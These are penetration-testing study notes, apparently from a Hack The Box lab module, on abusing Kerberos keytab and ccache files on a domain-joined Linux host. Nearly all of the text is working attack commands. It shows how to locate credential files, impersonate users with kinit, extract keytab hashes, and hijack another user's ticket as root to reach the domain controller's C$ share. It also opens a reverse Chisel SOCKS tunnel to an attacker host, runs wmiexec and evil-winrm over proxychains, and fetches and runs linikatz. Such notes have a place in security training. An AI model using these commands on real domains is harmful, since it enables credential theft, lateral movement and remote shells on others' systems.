## Identifying Linux and Active Directory Integration

We can identify if the Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

#### realm - Check If Linux Machine is Domain Joined

```shell-session
david@inlanefreight.htb@linux01:~$ realm list
```
#### PS - Check if Linux Machine is Domain Joined

  PS - Check if Linux Machine is Domain Joined

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
```
## Finding Keytab Files

#### Using Find to Search for Files with Keytab in the Name

  Using Find to Search for Files with Keytab in the Name

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```
#### Identifying Keytab Files in Cronjobs

  Identifying Keytab Files in Cronjobs

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l
```
## Finding ccache Files

#### Reviewing Environment Variables for ccache Files.

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5
```
#### Searching for ccache Files in /tmp

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp
```
## Abusing KeyTab/CCache Files

#### Listing keytab File Information
```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t 
```
#### Impersonating a User with a keytab

  Impersonating a User with a keytab

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```
#### Connecting to SMB Share as Carlos

  Connecting to SMB Share as Carlos

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
```
#### Extracting Keytab Hashes with KeyTabExtract

  Extracting Keytab Hashes with KeyTabExtract

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
#### Importing the ccache File into our Current Session

  Importing the ccache File into our Current Session

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

## Using Linux Attack Tools with Kerberos 

### Chisel
#### Host File Modified

```shell-session
Tachipy@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.

#### Proxychains Configuration File

  Proxychains Configuration File

```shell-session
Tachipy@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```
.

#### Download Chisel to our Attack Host

  Download Chisel to our Attack Host

```shell-session
Tachipy@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Tachipy@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
Tachipy@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
Tachipy@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```
#### Connect to MS01 with xfreerdp

  Connect to MS01 with xfreerdp

```shell-session
Tachipy@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Execute chisel from MS01

  Execute chisel from MS01

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```
#### Setting the KRB5CCNAME Environment Variable



```shell-session
Tachipy@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
### Impacket

#### Using Impacket with proxychains and Kerberos Authentication

```shell-session
Tachipy@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
```
### Evil-Winrm

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.

#### Installing Kerberos Authentication Package

  Installing Kerberos Authentication Package

```shell-session
Tachipy@htb[/htb]$ sudo apt-get install krb5-user -y
```
In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
#### Using Evil-WinRM with Kerberos

  Using Evil-WinRM with Kerberos

```shell-session
Tachipy@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Misc
#### Impacket Ticket Converter

```shell-session
Tachipy@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
#### Linikatz Download and Execution

  Linikatz Download and Execution

```shell-session
Tachipy@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
Tachipy@htb[/htb]$ /opt/linikatz.sh
```